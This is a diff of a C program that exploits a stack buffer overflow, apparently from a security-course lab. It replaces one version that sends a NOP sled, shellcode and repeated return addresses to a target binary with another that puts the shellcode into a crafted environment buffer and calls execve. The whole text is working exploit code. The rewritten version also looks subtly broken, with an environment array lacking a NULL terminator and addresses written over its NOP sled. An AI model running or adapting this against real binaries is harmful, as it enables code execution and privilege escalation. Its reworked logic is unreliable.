@@ -5,39 +5,35 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target2"
+#define TARGET "/srv/target3"
 
-int main(void)
-{
-  char *args[4]; 
-  char *env[1];
+int main(void) {
+    char *args[] = {
+        TARGET,
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
+        NULL
+    };
 
-  char str[408];
-  memset(str, 0, 408);
+    static char environment[400] = {0};
+    uint32_t base_address = 0xffffdec0;
 
-  for (int i = 0; i < 203; i++)
-  {
-  	strcat(str, "\x90");
-  }
+    // Fill the environment buffer with NOPs
+    memset(environment, 0x90, sizeof(environment) - 1);
 
-  strcat(str, shellcode);
-  
-  for (int i = 0; i < 38; i++)
-  {
+    // Adjust return address in the environment
+    *((uint32_t *)(environment)) = base_address + 4;
+    *((uint32_t *)(environment + 4)) = base_address + 8;
 
-    strcat(str, "\xb4\xde\xff\xff");
+    // Copy the shellcode to a specific offset within the environment
+    memcpy(environment + 201, shellcode, sizeof(shellcode));
 
-  }
-  args[0] = TARGET;
-  args[1] = str;
+    char *env[] = {environment};
 
-  args[2] = "65935";
-  args[3] = NULL;
+    // Attempt to execute the target binary with the crafted arguments and environment
+    execve(TARGET, args, env);
 
-  env[0] = NULL;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+    // If execve fails, print an error message
+    fprintf(stderr, "execve failed.\n");
 
-  return 0;
+    return 0;
 }
-
